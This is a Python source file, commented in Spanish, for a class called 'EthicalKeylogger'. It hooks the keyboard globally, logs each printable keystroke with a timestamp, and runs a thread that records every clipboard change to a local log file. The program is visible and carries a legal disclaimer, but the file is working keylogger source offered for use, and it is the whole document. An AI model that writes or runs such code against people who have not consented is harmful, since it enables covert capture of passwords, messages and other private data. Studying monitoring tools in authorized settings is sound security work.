import keyboard
import threading
import time
import pyperclip
from datetime import datetime
import os
import sys

class EthicalKeylogger:
    # Teclas a ignorar (no imprimibles ni de control)
    SKIP_KEYS = {
        "ctrl", "shift", "alt", "alt gr", "tab", "caps lock",
        "left", "right", "up", "down",
        "enter", "esc", "backspace", "delete", "home", "end",
        "page up", "page down", "insert", "print screen",
    }

    def __init__(self, log_file="keystrokes_log.txt", max_log_size=1024*1024):
        self.log_file = log_file
        self.max_log_size = max_log_size
        self.start_time = datetime.now()
        # Inicializamos el contenido actual del portapapeles
        try:
            self._last_clipboard = pyperclip.paste()
        except Exception:
            self._last_clipboard = ""
        self._pressed_scancodes = set()

        self.legal_warning = """
        ADVERTENCIA LEGAL:
        Este software es solo para fines educativos y de investigación en ciberseguridad.
        Su uso en sistemas sin autorización explícita es ilegal.
        Usted es responsable de cumplir con todas las leyes locales y federales.
        """
        print(self.legal_warning)

    def check_log_size(self) -> bool:
        if os.path.exists(self.log_file):
            return os.path.getsize(self.log_file) < self.max_log_size
        return True

    def _write_log(self, text: str) -> bool:
        """Escribe en el archivo de log de forma segura."""
        if not self.check_log_size():
            print("Tamaño máximo de registro alcanzado. Deteniendo...")
            keyboard.unhook_all()
            return False
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(text)
        return True

    def on_key_event(self, event) -> bool:
        """Procesa cada evento de teclado, filtrando repeats y solo down."""
        try:
            # 1) Solo procesar 'down'
            if event.event_type != "down":
                return True

            sc = event.scan_code
            # 2) Evitar auto-repeats
            if sc in self._pressed_scancodes:
                return True
            self._pressed_scancodes.add(sc)
            # Liberar scan_code tras breve retardo para la próxima pulsación
            threading.Timer(0.1, lambda: self._pressed_scancodes.discard(sc)).start()

            name = event.name.lower()

            # 3) Filtrar Ctrl+C (lo capturará el hilo de clipboard)
            if name == "c" and keyboard.is_pressed("ctrl"):
                return True

            # 4) Ignorar teclas de control y flechas
            if name in self.SKIP_KEYS:
                return True

            # 5) Solo caracteres imprimibles y espacio
            if len(name) != 1 and name != "space":
                return True
            char = " " if name == "space" else name

            # 6) Registrar en log
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            return self._write_log(f"[{ts}] TECLA: {char}\n")

        except Exception as e:
            print(f"Error al registrar tecla: {e}")
            return True

    def _monitor_clipboard(self):
        """Hilo que revisa el portapapeles cada segundo y registra cambios después de iniciar."""
        while True:
            try:
                current = pyperclip.paste()
                # Sólo si cambió y es distinto al inicial o al último registrado
                if current and current != self._last_clipboard:
                    self._last_clipboard = current
                    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    if not self._write_log(f"[{ts}] CLIPBOARD: {current}\n"):
                        break
            except Exception:
                pass
            time.sleep(1)

    def start(self):
        """Inicia el keylogger y el monitor de portapapeles."""
        print(f"Iniciando registro de teclas y portapapeles en {self.log_file}")
        print("Presione CTRL+C para detener...")

        # Arranca el hilo demonio de monitor de clipboard
        t = threading.Thread(target=self._monitor_clipboard, daemon=True)
        t.start()

        try:
            keyboard.hook(self.on_key_event)
            keyboard.wait()
        except KeyboardInterrupt:
            print("\nDeteniendo el keylogger...")
        finally:
            keyboard.unhook_all()
            duration = datetime.now() - self.start_time
            print(f"Registro completado. Duración: {duration}")
            print(f"Los datos se guardaron en: {os.path.abspath(self.log_file)}")

if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))

    log_path = os.path.join(application_path, "keystrokes_log.txt")
    keylogger = EthicalKeylogger(log_path)
    try:
        keylogger.start()
    except Exception as e:
        print(f"Error inesperado: {e}")
